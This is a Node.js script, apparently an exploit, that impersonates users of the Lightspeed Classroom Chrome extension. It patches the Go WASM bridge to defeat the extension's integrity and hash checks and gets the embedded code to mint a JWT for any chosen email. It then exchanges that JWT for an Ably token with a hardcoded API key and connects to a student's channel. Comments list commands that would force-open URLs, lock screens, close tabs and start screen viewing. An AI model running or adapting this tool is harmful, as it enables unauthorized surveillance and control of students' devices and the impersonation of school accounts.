import Ably from "ably";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import readline from "readline"
import crypto, { webcrypto } from "crypto";
import { TextEncoder, TextDecoder } from "util";
import { performance } from "perf_hooks";

const __dirname = path.dirname(fileURLToPath(import.meta.url));


// --- Configuration ---
let CONFIG = {
  email: "",
  customerId: "",
  ablyApiKey: "G52kOXvb7p7UbwFRV3ahn74m6xklosio2XUdLlTL",
  ablyUrl: "https://ably.lightspeedsystems.app/",
  apiUri: "https://devices.classroom.relay.school",
  telemetryHost: "agent-backend-api-production.lightspeedsystems.com",
  telemetryKey: "lolz",
  extensionId: "not needed?",
  version: "5.1.7.1773264644",
};

// --- Node.js polyfills ---
try {
  globalThis.crypto = webcrypto;
} catch (e) {}
if (typeof globalThis.TextEncoder === "undefined")
  globalThis.TextEncoder = TextEncoder;
if (typeof globalThis.TextDecoder === "undefined")
  globalThis.TextDecoder = TextDecoder;
if (typeof globalThis.performance === "undefined")
  globalThis.performance = performance;
try {
  globalThis.window = globalThis;
} catch (e) {}
try {
  globalThis.self = globalThis;
} catch (e) {}
globalThis.fs = fs;
const _encoder = new TextEncoder();
const _decoder = new TextDecoder();

// --- Minimal Chrome API mock ---
// The WASM only touches: chrome.runtime.getURL, getManifest,
// chrome.identity.getProfileUserInfo, chrome.enterprise.deviceAttributes
const ORIGIN = `chrome-extension://${CONFIG.extensionId}`;
globalThis.location = {
  origin: ORIGIN,
  href: `${ORIGIN}/worker.js`,
  protocol: "chrome-extension:",
  host: CONFIG.extensionId,
  hostname: CONFIG.extensionId,
  pathname: "/worker.js",
};

globalThis.importScripts = () => {};
globalThis.clients = { matchAll: async () => [], claim: async () => {} };

const identity = { email: CONFIG.email };

function getManifest() {
  try {
    return JSON.parse(
      fs.readFileSync(path.join(__dirname, "manifest.json"), "utf-8"),
    );
  } catch {
    return { version: CONFIG.version };
  }
}

globalThis.chrome = {
  runtime: {
    id: CONFIG.extensionId,
    getURL: (p) => `${ORIGIN}/${p}`,
    getManifest,
    getPlatformInfo: (cb) =>
      cb && cb({ os: "cros", arch: "x86-64", nacl_arch: "x86-64" }),
  },
  identity: {
    getProfileUserInfo: (cb) => {
      if (cb) cb(identity);
      return Promise.resolve(identity);
    },
  },
  enterprise: {
    deviceAttributes: {
      getDirectoryDeviceId: (cb) => {
        if (cb) cb(CONFIG.customerId);
      },
      getDeviceSerialNumber: (cb) => {
        if (cb) cb("");
      },
      getDeviceAssetId: (cb) => {
        if (cb) cb("");
      },
    },
  },
};

// --- Fetch mock ---
// Resolves chrome-extension:// URLs to local files, passes through https://
const realFetch = globalThis.fetch;
globalThis.fetch = async (url, opts) => {
  const s = typeof url === "string" ? url : url.url;
  if (s.startsWith("chrome-extension://")) {
    const filename = s.split("/").pop();
    const fp = path.join(__dirname, filename);
    if (fs.existsSync(fp)) {
      const buf = fs.readFileSync(fp);
      const ct = filename.endsWith(".wasm")
        ? "application/wasm"
        : filename.endsWith(".json")
          ? "application/json"
          : "application/javascript";
      return new Response(buf, {
        status: 200,
        headers: { "Content-Type": ct },
      });
    }
    return new Response("", { status: 404 });
  }
  return realFetch(url, opts);
};

// --- LSClassroom state (minimal) ---
// The WASM registers functions on LSClassroom.WASM during Go main().
// We also provide the JS-side callback arrays that the WASM calls into.
const callbacks = { ident: [], ip: [], tab: [] };

globalThis.LSClassroom = {
  WASM: {
    Debug: (...args) => {
      console.log("[wasm.Debug]", ...args);
    },
    SetIdentCB: (fn) => callbacks.ident.push(fn),
    SendIdentCB: (data) =>
      callbacks.ident.forEach((fn) => {
        try {
          fn(data);
        } catch (e) {}
      }),
    SetIPCB: (fn) => callbacks.ip.push(fn),
    SendIPCB: (data) =>
      callbacks.ip.forEach((fn) => {
        try {
          fn(data);
        } catch (e) {}
      }),
    SetTabCB: (fn) => callbacks.tab.push(fn),
    SendTabCB: (data) =>
      callbacks.tab.forEach((fn) => {
        try {
          fn(data);
        } catch (e) {}
      }),
  },
};

// --- Go WASM runtime bridge (standard wasm_exec.js, with patched valueCall) ---
// Faithfully reproduced from the worker's embedded Go class, with 2 patches:
//   - getProfileUserInfo.toString() returns "native code" (integrity bypass)
//   - worker.js URL redirected to worker_copy.js (hash bypass)

globalThis.Go = class Go {
  constructor() {
    this.argv = ["js"];
    this.env = {};
    this.exit = (code) => {
      if (code !== 0) console.warn("Go exit:", code);
    };
    this._exitPromise = new Promise((r) => {
      this._resolveExitPromise = r;
    });
    this._pendingEvent = null;
    this._scheduledTimeouts = new Map();
    this._nextCallbackTimeoutID = 1;
    const go = this;
    const _timeOrigin = Date.now() - performance.now();

    this.importObject = {
      _gotest: { add: (a, b) => a + b },
      gojs: {
        "runtime.wasmExit": (sp) => {
          sp >>>= 0;
          go.exited = true;
          delete go._inst;
          delete go._values;
          delete go._goRefCounts;
          delete go._ids;
          delete go._idPool;
          go.exit(go.mem.getInt32(sp + 8, true));
        },
        "runtime.wasmWrite": (sp) => {
          sp >>>= 0;
          const fd = go._getInt64(sp + 8);
          const p = go._getInt64(sp + 16);
          const n = go.mem.getInt32(sp + 24, true);
          fs.writeSync(fd, new Uint8Array(go._inst.exports.mem.buffer, p, n));
        },
        "runtime.resetMemoryDataView": () => {
          go.mem = new DataView(go._inst.exports.mem.buffer);
        },
        "runtime.nanotime1": (sp) => {
          go._setInt64(
            8 + (sp >>>= 0),
            (_timeOrigin + performance.now()) * 1000000,
          );
        },
        "runtime.walltime": (sp) => {
          sp >>>= 0;
          const m = new Date().getTime();
          go._setInt64(sp + 8, m / 1000);
          go.mem.setInt32(sp + 16, (m % 1000) * 1000000, true);
        },
        "runtime.scheduleTimeoutEvent": (sp) => {
          sp >>>= 0;
          const id = go._nextCallbackTimeoutID++;
          go._scheduledTimeouts.set(
            id,
            setTimeout(
              () => {
                go._resume();
                while (go._scheduledTimeouts.has(id)) {
                  console.warn("scheduleTimeoutEvent: missed timeout event");
                  go._resume();
                }
              },
              go._getInt64(sp + 8),
            ),
          );
          go.mem.setInt32(sp + 16, id, true);
        },
        "runtime.clearTimeoutEvent": (sp) => {
          sp >>>= 0;
          clearTimeout(
            go._scheduledTimeouts.get(go.mem.getInt32(sp + 8, true)),
          );
          go._scheduledTimeouts.delete(go.mem.getInt32(sp + 8, true));
        },
        "runtime.getRandomData": (sp) => {
          crypto.getRandomValues(
            new Uint8Array(
              go._inst.exports.mem.buffer,
              go._getInt64(8 + (sp >>>= 0)),
              go._getInt64(sp + 16),
            ),
          );
        },
        "syscall/js.finalizeRef": (sp) => {
          sp >>>= 0;
          const id = go.mem.getUint32(sp + 8, true);
          go._goRefCounts[id]--;
          if (go._goRefCounts[id] === 0) {
            const v = go._values[id];
            go._values[id] = null;
            go._ids.delete(v);
            go._idPool.push(id);
          }
        },
        "syscall/js.stringVal": (sp) => {
          go._storeValue(24 + (sp >>>= 0), go._loadString(sp + 8));
        },
        "syscall/js.valueGet": (sp) => {
          sp >>>= 0;
          const recv = go._loadValue(sp + 8);
          const name = go._loadString(sp + 16);
          const result = Reflect.get(recv, name);
          sp = go._inst.exports.getsp() >>> 0;
          go._storeValue(sp + 32, result);
        },
        "syscall/js.valueSet": (sp) => {
          sp >>>= 0;
          Reflect.set(
            go._loadValue(sp + 8),
            go._loadString(sp + 16),
            go._loadValue(sp + 32),
          );
        },
        "syscall/js.valueDelete": (sp) => {
          sp >>>= 0;
          Reflect.deleteProperty(
            go._loadValue(sp + 8),
            go._loadString(sp + 16),
          );
        },
        "syscall/js.valueIndex": (sp) => {
          go._storeValue(
            24 + (sp >>>= 0),
            Reflect.get(go._loadValue(sp + 8), go._getInt64(sp + 16)),
          );
        },
        "syscall/js.valueSetIndex": (sp) => {
          sp >>>= 0;
          Reflect.set(
            go._loadValue(sp + 8),
            go._getInt64(sp + 16),
            go._loadValue(sp + 24),
          );
        },

        "syscall/js.valueCall": (sp) => {
          sp >>>= 0;
          try {
            const recv = go._loadValue(sp + 8);
            const name = go._loadString(sp + 16);
            const args = go._loadSliceOfValues(sp + 32);

            // ── PATCH 1: integrity bypass ──
            // WASM checks getProfileUserInfo.toString() for "native code"
            if (
              name === "toString" &&
              recv === chrome.identity.getProfileUserInfo
            ) {
              sp = go._inst.exports.getsp() >>> 0;
              go._storeValue(
                sp + 56,
                "function getProfileUserInfo() { [native code] }",
              );
              go.mem.setUint8(sp + 64, 1);
              return;
            }
            // ── PATCH 2: hash bypass ──
            // WASM hashes worker.js — redirect to unmodified copy
            if (
              args[0] &&
              typeof args[0] === "string" &&
              args[0].endsWith("/worker.js")
            ) {
              args[0] = args[0].replace(/worker\.js$/, "worker_copy.js");
            }
            // ── END PATCHES ──

            const fn = Reflect.get(recv, name);
            if (typeof fn !== "function") {
              console.log(
                `[wasm] valueCall(${recv?.constructor?.name || typeof recv}.${name}) — not a function: ${fn}`,
              );
              sp = go._inst.exports.getsp() >>> 0;
              go._storeValue(
                sp + 56,
                new TypeError(`${name} is not a function`),
              );
              go.mem.setUint8(sp + 64, 0);
              return;
            }
            const result = Reflect.apply(fn, recv, args);
            sp = go._inst.exports.getsp() >>> 0;
            go._storeValue(sp + 56, result);
            go.mem.setUint8(sp + 64, 1);
          } catch (err) {
            sp = go._inst.exports.getsp() >>> 0;
            go._storeValue(sp + 56, err);
            go.mem.setUint8(sp + 64, 0);
          }
        },

        "syscall/js.valueInvoke": (sp) => {
          sp >>>= 0;
          try {
            const result = Reflect.apply(
              go._loadValue(sp + 8),
              undefined,
              go._loadSliceOfValues(sp + 16),
            );
            sp = go._inst.exports.getsp() >>> 0;
            go._storeValue(sp + 40, result);
            go.mem.setUint8(sp + 48, 1);
          } catch (e) {
            sp = go._inst.exports.getsp() >>> 0;
            go._storeValue(sp + 40, e);
            go.mem.setUint8(sp + 48, 0);
          }
        },
        "syscall/js.valueNew": (sp) => {
          sp >>>= 0;
          try {
            const result = Reflect.construct(
              go._loadValue(sp + 8),
              go._loadSliceOfValues(sp + 16),
            );
            sp = go._inst.exports.getsp() >>> 0;
            go._storeValue(sp + 40, result);
            go.mem.setUint8(sp + 48, 1);
          } catch (e) {
            sp = go._inst.exports.getsp() >>> 0;
            go._storeValue(sp + 40, e);
            go.mem.setUint8(sp + 48, 0);
          }
        },
        "syscall/js.valueLength": (sp) => {
          go._setInt64(
            16 + (sp >>>= 0),
            parseInt(go._loadValue(sp + 8).length),
          );
        },
        "syscall/js.valuePrepareString": (sp) => {
          sp >>>= 0;
          const str = _encoder.encode(String(go._loadValue(sp + 8)));
          go._storeValue(sp + 16, str);
          go._setInt64(sp + 24, str.length);
        },
        "syscall/js.valueLoadString": (sp) => {
          sp >>>= 0;
          const str = go._loadValue(sp + 8);
          const ln = go._getInt64(sp + 16);
          new Uint8Array(go._inst.exports.mem.buffer, ln).set(str);
        },
        "syscall/js.valueInstanceOf": (sp) => {
          go.mem.setUint8(
            24 + (sp >>>= 0),
            go._loadValue(sp + 8) instanceof go._loadValue(sp + 16) ? 1 : 0,
          );
        },
        "syscall/js.copyBytesToGo": (sp) => {
          sp >>>= 0;
          const dst = new Uint8Array(
            go._inst.exports.mem.buffer,
            go._getInt64(sp + 16),
          );
          const src = go._loadValue(sp + 32);
          if (!(src instanceof Uint8Array)) {
            go.mem.setUint8(sp + 48, 0);
            return;
          }
          go.mem.setUint8(sp + 48, 1);
          go._setInt64(
            sp + 40,
            src.copyWithin
              ? src.copyWithin(0, dst.subarray(0, src.length))
              : dst.set(src.subarray(0, dst.length)),
          );
        },
        "syscall/js.copyBytesToJS": (sp) => {
          sp >>>= 0;
          const dst = go._loadValue(sp + 16);
          const src = new Uint8Array(
            go._inst.exports.mem.buffer,
            go._getInt64(sp + 32),
          );
          if (!(dst instanceof Uint8Array)) {
            go.mem.setUint8(sp + 48, 0);
            return;
          }
          go.mem.setUint8(sp + 48, 1);
          go._setInt64(
            sp + 40,
            dst.set
              ? dst.set(src.subarray(0, dst.length))
              : src.copyWithin(0, dst.subarray(0, src.length)),
          );
        },
      },
    };
  }

  _setInt64(addr, v) {
    this.mem.setUint32(addr, v, true);
    this.mem.setUint32(addr + 4, Math.floor(v / 4294967296), true);
  }
  _getInt64(addr) {
    return (
      this.mem.getUint32(addr, true) +
      this.mem.getInt32(addr + 4, true) * 4294967296
    );
  }

  _loadValue(addr) {
    const f = this.mem.getFloat64(addr, true);
    if (f !== 0) {
      if (!isNaN(f)) return f;
    }
    return this._values[this.mem.getUint32(addr, true)];
  }

  _storeValue(addr, v) {
    const nanHead = 2146959360;
    if (typeof v === "number") {
      if (v !== 0 && !isNaN(v)) {
        this.mem.setFloat64(addr, v, true);
        return;
      }
      if (isNaN(v)) {
        this.mem.setUint32(addr + 4, nanHead, true);
        this.mem.setUint32(addr, 0, true);
        return;
      }
    }
    if (v === undefined) {
      this.mem.setFloat64(addr, 0, true);
      return;
    }
    let id = this._ids.get(v);
    if (id === undefined) {
      id = this._idPool.pop();
      if (id === undefined) id = this._values.length;
    }
    this._values[id] = v;
    this._goRefCounts[id] = 0;
    this._ids.set(v, id);
    let typeFlag = 0;
    switch (typeof v) {
      case "object":
        if (v !== null) typeFlag = 1;
        break;
      case "string":
        typeFlag = 2;
        break;
      case "symbol":
        typeFlag = 3;
        break;
      case "function":
        typeFlag = 4;
        break;
    }
    this.mem.setUint32(addr + 4, nanHead | typeFlag, true);
    this.mem.setUint32(addr, id, true);
  }

  _loadString(addr) {
    const s = this._getInt64(addr);
    const l = this._getInt64(addr + 8);
    return _decoder.decode(new DataView(this._inst.exports.mem.buffer, s, l));
  }

  _loadSliceOfValues(addr) {
    const arr = this._getInt64(addr);
    const len = this._getInt64(addr + 8);
    const a = new Array(len);
    for (let i = 0; i < len; i++) a[i] = this._loadValue(arr + i * 8);
    return a;
  }

  async run(instance) {
    if (!(instance instanceof WebAssembly.Instance))
      throw new Error("Go.run: WebAssembly.Instance expected");
    this._inst = instance;
    this.mem = new DataView(this._inst.exports.mem.buffer);
    this._values = [NaN, 0, null, true, false, globalThis, this];
    this._goRefCounts = new Array(this._values.length).fill(Infinity);
    this._ids = new Map([
      [0, 1],
      [null, 2],
      [true, 3],
      [false, 4],
      [globalThis, 5],
      [this, 6],
    ]);
    this._idPool = [];
    this.exited = false;

    const go = this;
    let offset = 4096;
    const strPtr = (str) => {
      const ptr = offset;
      const bytes = _encoder.encode(str + "\0");
      new Uint8Array(go._inst.exports.mem.buffer).set(bytes, offset);
      offset += bytes.length;
      if (offset % 8 !== 0) offset += 8 - (offset % 8);
      return ptr;
    };

    const argc = this.argv.length;
    const argvPtrs = [];
    this.argv.forEach((a) => argvPtrs.push(strPtr(a)));
    argvPtrs.push(0);
    Object.keys(this.env)
      .sort()
      .forEach((k) => argvPtrs.push(strPtr(`${k}=${this.env[k]}`)));
    argvPtrs.push(0);
    const argvPtr = offset;
    argvPtrs.forEach((p) => {
      this.mem.setUint32(offset, p, true);
      this.mem.setUint32(offset + 4, 0, true);
      offset += 8;
    });
    if (offset >= 12288)
      throw new Error(
        "total length of command line and environment variables exceeds limit",
      );

    this._inst.exports.run(argc, argvPtr);
    if (this.exited) {
      this._resolveExitPromise();
    }
    await this._exitPromise;
  }

  _resume() {
    if (this.exited) throw new Error("Go program has already exited");
    this._inst.exports.resume();
    if (this.exited) {
      this._resolveExitPromise();
    }
  }

  _makeFuncWrapper(id) {
    const go = this;
    return function () {
      const event = { id, this: this, args: arguments };
      go._pendingEvent = event;
      go._resume();
      return event.result;
    };
  }
};

function copyBytes(dst, src) {
  const n = Math.min(src.length, dst.length);
  dst.set(src.subarray(0, n));
  return n;
}

// ═══════════════════════════════════════════════════════════════
// STEP 1: Load the WASM and extract the JWT
// ═══════════════════════════════════════════════════════════════

export async function getJwtFromWasm(newConfig = {}) {
  if (newConfig) CONFIG = newConfig;
  const wasmPath = path.join(__dirname, "classroom.wasm");
  if (!fs.existsSync(wasmPath)) throw new Error("classroom.wasm not found");

  const go = new Go();
  const wasmBytes = fs.readFileSync(wasmPath);
  const { instance } = await WebAssembly.instantiate(
    wasmBytes,
    go.importObject,
  );

  // go.run() starts the Go runtime. The WASM's main() registers
  // functions like Setup(), ConfigureClass(), etc. on LSClassroom.WASM
  go.run(instance);

  // Give the WASM a tick to finish registering its functions
  await new Promise((r) => setTimeout(r, 500));

  // Call Setup with the target district's config
  console.log("[1] Calling LSClassroom.WASM.Setup()...");
  LSClassroom.WASM.Setup(
    CONFIG.customerId,
    CONFIG.version,
    CONFIG.telemetryHost,
    CONFIG.telemetryKey,
  );

  // Create a blank object — the WASM will add a SetIdent method to it
  // that generates a JWT when called with an email address
  const classObj = {};
  console.log("[2] Calling LSClassroom.WASM.ConfigureClass()...");
  LSClassroom.WASM.ConfigureClass(classObj);

  // Optionally fetch policy from the server (may be required by newer versions)
  // The policy endpoint returns a JWT that the WASM uses during identity verification
  try {
    console.log("[3] Fetching policy from", `${CONFIG.apiUri}/policy`);
    const policyRes = await realFetch(`${CONFIG.apiUri}/policy`, {
      method: "POST",
      headers: {
        "x-api-key": CONFIG.ablyApiKey,
        "Content-Type": "application/json",
        customerid: CONFIG.customerId,
        'User-Agent': 'Mozilla/5.0 (X11; CrOS x86_64 16610.44.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.115 Safari/537.36'
      },
      body: JSON.stringify({ username: CONFIG.email }),
    });
    if (policyRes.ok) {
      const policy = await policyRes.json();
      console.log("[3] Policy:", JSON.stringify(policy, null, 2));
      if (policy.jwt) {
        LSClassroom.WASM.PolicyData(
          policy.jwt,
          policy.email || CONFIG.email,
          policy.user_guid || "",
        );
      }
    } else {
      console.log(
        "[3] Policy fetch failed (status",
        policyRes.status,
        ") — continuing without it",
      );
    }
  } catch (e) {
    console.log(
      "[3] Policy fetch error:",
      e.message,
      "— continuing without it",
    );
  }

  await new Promise((r) => setTimeout(r, 200));

  // The moment of truth: call SetIdent(email) → WASM generates and returns the JWT
  // using the signing key embedded in the Go binary
  console.log("[4] Calling classObj.SetIdent() — WASM generates JWT...");
  const jwt = classObj.SetIdent(CONFIG.email);
  if (!jwt) throw new Error("WASM returned empty JWT — SetIdent failed");

  console.log("[4] JWT obtained:", jwt.substring(0, 40) + "...");
  return jwt;
}

// ═══════════════════════════════════════════════════════════════
// STEP 2: Exchange the JWT for an Ably token (the only auth API call)
// ═══════════════════════════════════════════════════════════════

async function getAblyToken(jwt) {
  // This is the single API call that matters:
  // Send the WASM-generated JWT to Lightspeed's Ably endpoint
  // along with the public API key (hardcoded in the extension)
  console.log("[5] Exchanging JWT for Ably token at", CONFIG.ablyUrl);
  const res = await realFetch(
    `${CONFIG.ablyUrl}?clientId=${encodeURIComponent(CONFIG.email)}`,
    {
      headers: {
        "Content-Type": "application/json",
        "X-API-Key": CONFIG.ablyApiKey,
        "User-Agent": "fetch/25.9.0",
        jwt,
        exp: "10",
      },
    },
  );
  if (!res.ok) {
    const body = await res.text();
    console.error("[5] Ably response:", res.status, body);
    throw new Error(`Ably token exchange failed: ${res.status}`);
  }
  console.log("[5] Ably token received (status", res.status, ")");
  return res.text();
}

// ═══════════════════════════════════════════════════════════════
// STEP 3: Connect to target's Ably channel — full device control
// ═══════════════════════════════════════════════════════════════

async function connectAndControl(ablyToken) {
  const realtime = new Ably.Realtime({
    authCallback: async (_, cb) => cb(null, ablyToken),
    clientId: CONFIG.email,
    autoConnect: false,
    echoMessages: true,
    endpoint: "lightspeed",
    fallbackHosts: [
      "a-fallback-lightspeed.ably.io",
      "b-fallback-lightspeed.ably.io",
      "c-fallback-lightspeed.ably.io",
    ],
  });

  const channelName = `${CONFIG.customerId}:${CONFIG.email}`;
  console.log("[6] Connecting to Ably channel:", channelName);

  await new Promise((resolve, reject) => {
    realtime.connection.on("connected", () => {
      console.log("[6] Connected!", realtime.connection.id);
      resolve();
    });
    realtime.connection.on("failed", (e) => {
      console.error("[6] Connection failed:", e);
      reject(e);
    });
    realtime.connect();
  });

  const channel = realtime.channels.get(channelName);

  // ── Subscribe to ALL messages (no filter) ──
  channel.subscribe((msg) => {
    console.log(`[rx:${msg.name}]`, JSON.stringify(msg.data));
  });

  // ── Presence: see who's online on this channel ──
  channel.presence.subscribe((msg) => {
    console.log(
      `[presence:${msg.action}] ${msg.clientId}`,
      JSON.stringify(msg.data),
    );
  });

  // Check who's currently present
  const presenceSet = await channel.presence.get();
  if (presenceSet.length === 0) {
    console.log("[presence] Nobody currently online on this channel");
  } else {
    console.log(`[presence] ${presenceSet.length} client(s) online:`);
    for (const p of presenceSet) {
      console.log(`  - ${p.clientId}`, JSON.stringify(p.data));
    }
  }

  // ── Enter presence with viewingTabs to trigger student tab publish ──
  // The student watches for presence enter/update events containing viewingTabs
  // and responds by publishing tab data as "groupUpdate" messages
  channel.presence.enter({ viewingTabs: true });

  // ── Commands you can send (all require IsClassroomActive except unlock) ──
  // Uncomment to execute. Formats from the blog post:
  //
  // Force-open a URL on the student's device
  // channel.publish('url', 'https://example.com');
  //
  // Lock the student's screen (shows overlay message)
  // channel.publish('lock', { type: 'lock', lockMessage: 'Locked', lockedUntil: 2147483647 });
  //
  // Unlock the student's screen (does NOT require IsClassroomActive)
  // channel.publish('unlock');
  //
  // Close a specific tab (tabId/url from tabs data)
  // channel.publish('closeTab', { tabId: 123, url: 'https://example.com' });
  //
  // Focus (bring to front) a specific tab
  // channel.publish('focusTab', { tabId: 123, windowId: 456 });
  //
  // Send a notification popup to the student (requires IsClassroomActive)
  // channel.publish("tm", { mId: crypto.randomUUID(), m: "Hello" });
  //
  // Set hall pass state
  // channel.publish('setState', { state: 'ready' });
  //
  // Force the student's extension to re-fetch policy from server
  // channel.publish('policyUpdate');
  //
  // Force the student's extension to check for updates and reload
  // channel.publish('updateExtension');
  //
  // Initiate WebRTC screen view (requires active class schedule + group)
  // channel.publish('request_rtc', { sessionId: crypto.randomUUID(), role: 'viewer', want: ['video'] });
  //

  console.log("\n[done] Connected. Listening for all events...");
  console.log(
    "Commands: url, lock, unlock, closeTab, focusTab, tm, setState, policyUpdate, updateExtension, request_rtc\n",
  );

  // Keep alive
  await new Promise(() => {});
}

// ═══════════════════════════════════════════════════════════════
// Run
// ═══════════════════════════════════════════════════════════════
function ask(question) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) =>
    rl.question(question, (ans) => {
      rl.close();
      resolve(ans);
    })
  );
}
// COMMENT OUT IF USING WEB VIEWER
async function main() {
  try {

    // Prompt for Email
    const userEmail = await ask("Enter Email: ");
    if (!userEmail) throw new Error("Email is required.");
    CONFIG.email = userEmail.trim();

    // Prompt for Customer ID
    const userCustomerId = await ask("Enter Customer ID: ");
    if (!userCustomerId) throw new Error("Customer ID is required.");
    CONFIG.customerId = userCustomerId.trim();

    console.log(`\nInitializing for: ${CONFIG.email} (ID: ${CONFIG.customerId})\n`);

    const jwt = await getJwtFromWasm();
    const ablyToken = await getAblyToken(jwt);
    await connectAndControl(ablyToken);
  } catch (e) {
    console.error("\nFatal Error:", e.message);
    process.exit(1);
  }
};

if (process.argv[1] === fileURLToPath(import.meta.url)) main();
